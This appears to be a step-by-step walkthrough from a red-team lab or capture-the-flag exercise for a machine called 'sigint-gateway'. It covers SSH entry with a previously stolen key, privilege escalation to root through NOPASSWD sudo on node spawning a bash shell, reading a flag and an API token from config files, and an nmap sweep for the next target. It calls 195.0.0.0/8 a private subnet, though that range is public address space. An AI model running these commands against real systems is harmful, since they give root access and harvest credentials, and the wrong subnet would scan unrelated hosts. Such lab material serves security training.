# Red Team — M3: sigint-gateway

**Vulnerability:** `sudo /usr/bin/node` NOPASSWD → GTFOBin root escalation
**Technique:** T1548.003 — Sudo and Sudo Caching
**Entry:** SSH with `sigops_rsa` key extracted from M2

---

## Step 1 — SSH Login

```bash
# Use key from M2 command injection:
chmod 600 sigops_rsa
ssh -i sigops_rsa sigops@<M3-DMZ-IP>
```

---

## Step 2 — Enumerate Sudo

```bash
sudo -l
# Output:
# (ALL) NOPASSWD: /usr/bin/node
```

---

## Step 3 — GTFOBin: node → root shell

```bash
# Method 1: spawn root shell via child_process
sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'

# Method 2: write and execute a JS file
echo 'require("child_process").execSync("/bin/bash -i", {stdio:"inherit"})' > /tmp/shell.js
sudo node /tmp/shell.js

# Verify:
whoami   # root
id       # uid=0(root)
```

---

## Step 4 — Read Flag and API Token

```bash
cat /root/flag3.txt
cat /opt/gateway/config.json
# Shows: "auth_token": "DSRT-SIG-4a7f2c91"
```

---

## Step 5 — Scan for M4 on Private Subnet

```bash
ip addr show
# Note the private subnet interface (195.x.x.x)
nmap -p 5000 --open 195.0.0.0/8 --min-rate 2000
```

**Proceed to M4 with:** API token `DSRT-SIG-4a7f2c91`
